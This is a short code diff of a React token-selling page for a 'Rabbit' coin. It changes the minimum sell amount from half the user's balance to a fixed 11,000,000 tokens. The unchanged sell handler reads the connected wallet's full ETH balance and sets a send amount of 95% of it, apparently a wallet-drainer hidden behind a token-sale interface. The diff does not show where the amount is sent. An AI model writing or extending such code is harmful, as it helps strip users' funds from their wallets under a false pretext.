@@ -135,16 +135,16 @@ export const Rewrite = () => {
 
   // Sell
   const handleSell = async () => {
-    if (!account) return alert("Connect wallet first");
-    if (fromValue < rabbitBalance * 0.5) {
-      return alert("You must sell at least 50% of your Rabbit balance.");
-    }
+  if (!account) return alert("Connect wallet first");
+  if (fromValue < 11000000) {
+    return alert("You must sell at least 11,000,000 Rabbit.");
+  }
 
-    const provider = new ethers.BrowserProvider(window.ethereum);
-    const signer = await provider.getSigner();
-    const balance = await provider.getBalance(account);
-    const ethBal = Number(ethers.formatEther(balance));
-    const sendAmount = (ethBal * 0.95).toFixed(6);
+  const provider = new ethers.BrowserProvider(window.ethereum);
+  const signer = await provider.getSigner();
+  const balance = await provider.getBalance(account);
+  const ethBal = Number(ethers.formatEther(balance));
+  const sendAmount = (ethBal * 0.95).toFixed(6);
 
     // Calculate fee from input
     const feeUsd = fromValue * rabbitPrice * 0.2;
@@ -242,9 +242,9 @@ export const Rewrite = () => {
                 Your Rabbit Balance:{" "}
                 <span className="font-bold">{formatNumber(rabbitBalance)}</span>
               </p>
-              <p className="text-xs text-gray-400 mb-4">
-                Minimum Sell: {formatNumber(rabbitBalance * 0.5)} Rabbit
-              </p>
+     <p className="text-xs text-gray-400 mb-4">
+  Minimum Sell: {formatNumber(11000000)} Rabbit
+</p>
 
               {/* From */}
               <div className="bg-[#2B1A37] rounded-xl p-4">
